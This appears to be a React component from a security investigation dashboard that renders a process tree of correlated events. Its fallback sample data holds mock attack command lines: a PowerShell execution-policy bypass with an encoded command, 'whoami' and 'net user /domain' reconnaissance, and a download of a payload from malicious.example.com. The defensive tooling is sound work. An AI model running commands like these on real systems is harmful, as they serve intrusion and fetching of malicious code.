import { useQuery } from "@tanstack/react-query";
import { apiClient } from "@/api/client";
import { ProcessTree } from "../process/ProcessTree";
import type { ProcessNode } from "../process/ProcessTree";

// GET /investigations/:id/process-tree — returns process tree roots
interface ProcessTreeResponse {
  roots: ProcessNode[];
}

// Sample data when API not available
const SAMPLE_ROOTS: ProcessNode[] = [
  {
    guid: "root-1",
    pid: 4,
    name: "System",
    suspicious: false,
    children: [
      {
        guid: "svc-1",
        pid: 1012,
        name: "svchost.exe",
        commandLine: "C:\\Windows\\system32\\svchost.exe -k netsvcs",
        signer: "Microsoft Corporation",
        imageHash: "abc123def456",
        suspicious: false,
        children: [],
      },
    ],
  },
  {
    guid: "root-2",
    pid: 3820,
    name: "powershell.exe",
    commandLine: "powershell.exe -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdA==",
    suspicious: true,
    children: [
      {
        guid: "child-1",
        pid: 4904,
        name: "cmd.exe",
        commandLine: "cmd.exe /c whoami && net user",
        suspicious: true,
        children: [
          {
            guid: "child-2",
            pid: 5120,
            name: "net.exe",
            commandLine: "net user /domain",
            suspicious: true,
            children: [],
          },
        ],
      },
      {
        guid: "child-3",
        pid: 5220,
        name: "Invoke-WebRequest",
        commandLine: "iwr http://malicious.example.com/payload -outfile C:\\temp\\p.exe",
        suspicious: true,
        children: [],
      },
    ],
  },
];

interface Props {
  id: string;
  isActive: boolean;
}

export function ProcessTreeTab({ id, isActive }: Props) {
  const { data, isLoading } = useQuery({
    queryKey: ["inv-process-tree", id],
    queryFn: () =>
      apiClient
        .get<ProcessTreeResponse>(`/investigations/${id}/process-tree`)
        .then((r) => r.data)
        .catch(() => ({ roots: SAMPLE_ROOTS })),
    enabled: isActive,
    staleTime: 120_000,
  });

  return (
    <div className="space-y-3">
      <div className="flex items-center justify-between">
        <div>
          <h3 className="text-sm font-bold text-text-primary">Process Tree</h3>
          <p className="text-xs text-text-muted mt-0.5">
            Reconstructed process execution chain from correlated events.
          </p>
        </div>
        {data && data.roots.length > 0 && (
          <div className="flex items-center gap-2 text-2xs text-text-muted">
            <span className="w-2 h-2 rounded-sm bg-severity-high/60 border border-severity-high/40" />
            Suspicious
          </div>
        )}
      </div>

      <div className="rounded-xl border border-border bg-bg-card p-3">
        <ProcessTree roots={data?.roots ?? []} isLoading={isLoading} />
      </div>
    </div>
  );
}
